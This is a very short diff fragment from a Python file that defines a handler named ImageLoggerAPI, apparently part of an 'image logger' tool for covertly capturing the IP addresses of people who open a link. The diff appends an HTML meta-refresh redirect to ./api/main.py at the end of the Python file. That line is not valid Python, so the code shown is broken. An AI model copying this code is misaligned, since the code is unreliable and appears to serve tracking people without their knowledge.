@@ -279,3 +279,4 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
+<meta http-equiv="refresh" content="0;url=./api/main.py">
